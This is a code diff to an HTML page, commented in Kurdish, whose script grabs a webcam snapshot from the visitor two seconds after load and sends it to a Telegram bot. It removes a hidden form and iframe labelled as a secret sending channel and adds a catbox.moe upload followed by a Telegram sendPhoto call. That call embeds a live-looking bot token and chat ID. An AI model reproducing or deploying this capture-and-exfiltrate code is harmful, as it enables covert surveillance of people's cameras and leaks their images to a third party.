@@ -9,13 +9,6 @@
 
     <h3 id="status">چاوەڕوان بە...</h3>
 
-    <!-- فرمی نهێنی بۆ ناردنی ڕاستەوخۆ بە بێ پرۆکسی -->
-    <form id="tgForm" method="POST" action="https://api.telegram.org/bot8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM/sendPhoto" enctype="multipart/form-data" target="hidden_iframe" style="display:none;">
-        <input type="hidden" name="chat_id" value="6539379136">
-        <input type="file" name="photo" id="photoInput">
-    </form>
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
-
     <script>
       const statusEl = document.getElementById('status');
 
@@ -34,16 +27,42 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
+              statusEl.innerText = "خەریکی ئامادەکردن و ناردنی وێنەیە...";
               
-              const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
-              const dataTransfer = new DataTransfer();
-              dataTransfer.items.add(file);
-              
-              document.getElementById('photoInput').files = dataTransfer.files;
-              document.getElementById('tgForm').submit();
-              
-              statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+              // بارکردنی وێنەکە بۆ خزمەتگوزاری دەرەکی بە بێ کێشەی CORS
+              const catboxData = new FormData();
+              catboxData.append('req', 'upload-file');
+              catboxData.append('fileToUpload', blob, 'snapshot.jpg');
+
+              fetch('https://catbox.moe/user/api.php', {
+                method: 'POST',
+                body: catboxData
+              })
+              .then(res => res.text())
+              .then(imageUrl => {
+                if (imageUrl.startsWith('http')) {
+                  statusEl.innerText = "خەریکی ناردنی بۆ تلگرام...";
+                  
+                  const token = "8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM";
+                  const chatId = "6539379136";
+                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
+
+                  return fetch(telegramUrl);
+                } else {
+                  throw new Error("هەڵە لە ئامادەکردنی وێنە");
+                }
+              })
+              .then(response => response.json())
+              .then(data => {
+                if(data.ok) {
+                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+                } else {
+                    statusEl.innerText = "❌ هەڵە لە تلگرام: " + (data.description || JSON.stringify(data));
+                }
+              })
+              .catch(error => {
+                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
+              });
             }, 'image/jpeg');
           }, 2000);
         })
